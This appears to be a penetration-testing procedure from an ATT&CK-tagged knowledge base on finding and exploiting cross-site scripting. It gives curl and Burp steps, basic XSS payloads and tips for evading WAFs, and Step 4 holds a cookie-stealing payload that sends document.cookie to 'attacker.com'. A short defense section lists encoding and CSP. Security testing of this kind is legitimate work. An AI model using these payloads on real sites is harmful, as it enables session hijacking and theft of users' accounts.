---
id: d71dc723-5859-4f93-b19e-f9b823d914ce
name: XSS-Payload-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.802924+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Common Payloads]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/XSS in HTML/Applications]]'
  - xss
  - web-injection
commands:
  - '[[commands/curl-test-reflected-xss]]'
  - '[[commands/burp-send-xss-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# XSS-Payload-Injection

## Summary

This procedure demonstrates how to identify and exploit Cross-Site Scripting (XSS) vulnerabilities in web applications by injecting malicious JavaScript payloads into user inputs, such as forms or URL parameters. It covers testing for reflected, stored, and DOM-based XSS, allowing attackers to execute arbitrary code in victims' browsers to steal cookies, session tokens, or perform other actions. Primarily used during web application penetration testing to gain initial access or escalate privileges.

## Description

Cross-Site Scripting (XSS) occurs when a web application fails to properly sanitize user-supplied input, allowing attackers to inject and execute malicious scripts in the context of other users' browsers. This procedure focuses on injecting payloads to trigger JavaScript execution, such as alerting messages for proof-of-concept or more advanced actions like keylogging or credential theft. It applies to public-facing web apps vulnerable to input reflection without encoding. In a real attack, this can lead to session hijacking or phishing within the application. Prerequisites include access to the target web app and tools for intercepting/modifying requests. Expected outcomes include successful payload execution, confirmed by browser alerts or network exfiltration.

## Requirements

1. Access to a vulnerable web application (e.g., via browser or proxy).
2. Knowledge of potential injection points like search fields, comment forms, or URL parameters.
3. Installed tools such as curl for CLI testing or Burp Suite for advanced interception.
4. A wordlist of XSS payloads, such as the collection in [[codes/Collection-of-XSS-Payloads]].

## Defense

Defensive measures and detection strategies:

- Implement input validation and output encoding (e.g., HTML entity encoding) on all user inputs using libraries like OWASP ESAPI.
- Deploy Content Security Policy (CSP) headers to restrict script sources and inline execution.
- Use Web Application Firewalls (WAFs) like ModSecurity to detect and block common XSS patterns.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) and monitor for anomalous JavaScript execution via client-side logging.

## Objectives

1. Identify vulnerable input points in the web application.
2. Inject and execute malicious JavaScript payloads to confirm XSS.
3. Demonstrate impact, such as stealing session cookies or redirecting users.
4. Escalate to further exploitation like credential theft or persistent access.

## Instructions

### Step 1: Identify Injection Points

**Context**: Scan the web application for user-controllable inputs that are reflected back without sanitization, such as search boxes, login forms, or URL parameters. Use manual browsing or automated tools to map the app.

Navigate to the target application in a browser and inspect forms or parameters. For example, append a test string like "test<" to a URL parameter (e.g., ?search=test<) and check if it's reflected raw in the response.

**Expected Output**: Reflected input appears unescaped in the HTML source, e.g., <input value="test<"> shows as-is.

### Step 2: Test Basic Reflected XSS with Curl

**Context**: Use a command-line tool to send a simple payload to a suspected endpoint, verifying if it executes in a browser context. This isolates testing from browser protections.

**Command** ([[commands/curl-test-reflected-xss]]):
```bash
curl -X GET "http://target.com/search?q=$_PAYLOAD" -v
```

> Replace $_PAYLOAD with a basic test like <script>alert('XSS')</script>. The -v flag shows headers and response. If vulnerable, the response will contain the raw payload. Copy the response and open in a local HTML file or browser to confirm execution.

**Expected Output**: HTTP response with unescaped payload in body, e.g., 200 OK with HTML containing <script>alert('XSS')</script>.

### Step 3: Intercept and Inject Advanced Payloads with Burp Suite

**Context**: For more control, proxy traffic through Burp to modify requests and test evasive payloads that bypass filters, such as encoded or obfuscated variants.

**Command** ([[commands/burp-send-xss-payload]]):
```bash
# In Burp Repeater: Send POST with payload in body
curl -X POST "http://target.com/submit" -d "comment=$_PAYLOAD" --proxy http://127.0.0.1:8080 -v
```

> Configure Burp as proxy (127.0.0.1:8080). Intercept the request, replace the input with a payload from [[codes/Collection-of-XSS-Payloads]], such as <img src=x onerror=alert('XSS')>, and forward. Repeat for different encodings to evade WAFs.

**Expected Output**: Modified request forwarded, response shows payload execution (e.g., alert pops in browser replay).

### Step 4: Verify Execution and Escalate

**Context**: Confirm payload success by observing effects like alerts, then adapt for real impact (e.g., exfiltrate document.cookie).

Paste a payload like <script>document.location='http://attacker.com?cookie='+document.cookie</script> into the injection point and submit. Monitor your attacker server for incoming data.

**Expected Output**: Alert box or network request to attacker-controlled endpoint with stolen data.

**Success Indicators**:
- JavaScript executes (alert or console log appears).
- No encoding or stripping of < > characters in response.
- Payload evades any inline filters (test multiple variants).
